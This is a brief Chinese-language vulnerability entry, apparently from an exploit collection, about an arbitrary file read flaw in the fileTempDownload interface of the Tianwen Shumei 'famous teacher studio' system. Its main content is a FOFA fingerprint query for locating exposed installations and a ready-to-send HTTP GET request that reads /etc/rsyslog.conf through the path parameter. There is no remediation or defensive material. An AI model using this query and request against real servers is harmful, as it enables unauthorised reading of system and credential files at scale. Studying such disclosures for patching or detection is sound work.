# 天闻数媒名师工作室系统fileTempDownload任意文件读取

# 一、漏洞简介
天闻数媒名师工作室系统fileTempDownload接口存在任意文件读取漏洞

# 二、影响版本
+ 天闻数媒名师工作室系统

# 三、资产测绘
+ fofa`body="/static/js/bootstrap/bootstrap.css" && title="名师工作室"`

# 四、漏洞复现
```plain
GET /fileUploadAndDownload/fileTempDownload?path=/etc/rsyslog.conf HTTP/1.1
Host: 127.0.0.1:8080
```
